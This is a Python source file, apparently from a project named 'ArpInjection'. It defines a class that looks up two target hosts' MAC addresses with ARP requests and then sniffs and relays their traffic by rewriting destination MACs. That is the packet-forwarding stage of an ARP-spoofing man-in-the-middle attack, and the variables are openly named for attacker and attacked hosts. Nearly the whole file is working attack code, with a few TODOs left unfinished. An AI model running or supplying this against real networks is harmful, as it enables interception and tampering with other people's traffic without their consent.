from threading import Thread

from ArpInjection.addresses_helper import AddressesHelper
from ArpInjection.PacketBuilder import PacketBuilder
from ArpInjection.network_device import NetworkDevice
from ArpInjection.packet_analyzer import PacketAnalyzerFactory


class PacketTransferor(object):
    def __init__(self, attacker_ip, attacker_mac,  first_ip, second_ip, network_device, packet_analyzer_factory, packet_builder, addresses_helper):
        self.attacker_ip = attacker_ip
        self.attacker_mac = attacker_mac
        assert isinstance(network_device, NetworkDevice)
        self.network_device = network_device
        assert isinstance(packet_analyzer_factory, PacketAnalyzerFactory)
        self.packet_analyzer_factory= packet_analyzer_factory
        assert isinstance(packet_builder, PacketBuilder)
        self.packet_builder = packet_builder
        assert isinstance(addresses_helper, AddressesHelper)
        self.addresses_helper = addresses_helper

        self.first_ip = first_ip
        self.second_ip = second_ip
        self.transfer_thread = None
        self.first_mac = None
        self.second_mac = None

    def start_transfer_packets(self):
        self.__initialize_attacked_macs()
        self.transfer_thread = Thread(target=self.__sniff).start()

    def __initialize_attacked_macs(self):
        # TODO: implement getting mac by arp request
        arp_request_type = 1
        first_mac_arp_request = self.packet_builder.get_arp(
            self.attacker_mac,
            self.attacker_ip,
            self.addresses_helper.BROADCAST,
            self.first_ip,
            arp_request_type)
        second_mac_arp_request = self.packet_builder.get_arp(
            self.attacker_mac,
            self.attacker_ip,
            self.addresses_helper.BROADCAST,
            self.second_ip,
            arp_request_type)

        self.network_device.send_packet(first_mac_arp_request.get_packet())

        while self.first_mac is None:
            packet = self.network_device.receive_packet()
            parsed_packet = self.packet_analyzer_factory.create(packet)
            if parsed_packet.is_arp():
                if parsed_packet.src_ip == self.addresses_helper.get_ip_in_list_format(self.first_ip):
                    self.first_mac = parsed_packet.src_mac

        self.network_device.send_packet(second_mac_arp_request.get_packet())

        while self.second_mac is None:
            packet = self.network_device.receive_packet()
            parsed_packet = self.packet_analyzer_factory.create(packet)
            if parsed_packet.is_arp():
                if parsed_packet.src_ip == self.addresses_helper.get_ip_in_list_format(self.second_ip):
                    self.second_mac = parsed_packet.src_mac

    def __sniff(self):
        while True:
            packet = self.network_device.receive_packet()
            layer_above_ethernet_parsed_packet = self.packet_analyzer_factory.create(packet)
            ethernet_parsed_packet = self.packet_analyzer_factory.create(packet, True)
            send_packet = False
            try:
                # TODO: Check waht corrupted arp request can cause (dst mac in 2nd layer is different then the ARP's
                # TODO: mac).
                if list(ethernet_parsed_packet.dst_mac) != self.addresses_helper.get_mac_in_list_format2(self.addresses_helper.BROADCAST):
                    # The get_ip_to_compare function is used because sometimes the ip is in a list format and
                    # sometimes in a string format. Depends on the protocol.
                    # TODO: Maybe push a fix to impacket.
                    if self.get_ip_to_compare(layer_above_ethernet_parsed_packet.src_ip) == self.addresses_helper.get_ip_in_list_format(self.first_ip) and self.get_ip_to_compare(layer_above_ethernet_parsed_packet.dst_ip) == self.addresses_helper.get_ip_in_list_format(self.second_ip):
                        # If it is equal, it is the packet that we retransmitted, and now we received her again.
                        if list(ethernet_parsed_packet.dst_mac) != self.second_mac:
                            ethernet_parsed_packet.dst_mac = self.second_mac
                            send_packet = True
                    elif self.get_ip_to_compare(layer_above_ethernet_parsed_packet.src_ip) == self.addresses_helper.get_ip_in_list_format(self.second_ip) and self.get_ip_to_compare(layer_above_ethernet_parsed_packet.dst_ip) == self.addresses_helper.get_ip_in_list_format(self.first_ip):
                        if list(ethernet_parsed_packet.dst_mac) != self.first_mac:
                            ethernet_parsed_packet.dst_mac = self.first_mac
                            send_packet = True
                    else:
                        continue
            except Exception as exc:
                # TODO: add to logger.
                continue
            if send_packet:
                self.network_device.send_packet(ethernet_parsed_packet.packet_bytes)

    def get_ip_to_compare(self, ip):
        return ip if isinstance(ip, list) else [int(x) for x in ip.split(".")]